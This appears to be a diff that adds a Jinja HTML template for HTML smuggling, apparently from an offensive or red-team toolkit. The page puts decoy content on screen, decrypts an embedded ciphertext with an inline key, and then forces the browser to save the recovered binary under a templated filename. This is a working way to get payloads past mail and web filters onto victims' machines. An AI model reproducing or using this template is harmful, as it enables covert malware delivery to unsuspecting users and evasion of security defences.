@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html>
+    <head>
+    </head>
+    <body>
+        {{ decoy }}
+        <script>
+        
+            const key = "{{ key }}";
+            var ciphertext = atob("{{ ciphertext }}");
+            {% filter indent(width=12) %}
+            {{- payload_js }}
+            {% endfilter %}
+            const f = decrypt(key, ciphertext)
+            var binaryArray = new Uint8Array(f.length);
+            for ( let i = 0; i < f.length; i++ ) {
+                binaryArray[i] = f.charCodeAt(i)
+            }
+
+            if (window.navigator.msSaveBlob) {
+                var blob = new Blob([binaryArray]);
+                window.navigator.msSaveBlob(blob, "{{ filename }}");
+            } else {
+                var file = new File([binaryArray], "{{ filename }}", {type: "{{mimetype}}"})
+                var a = window.document.createElement("a");
+                a.href = window.URL.createObjectURL(file);
+                a.download = "{{ filename }}";
+                document.body.appendChild(a);
+                a.click();
+                document.body.removeChild(a);
+            }
+        </script>
+    </body>
+</html>
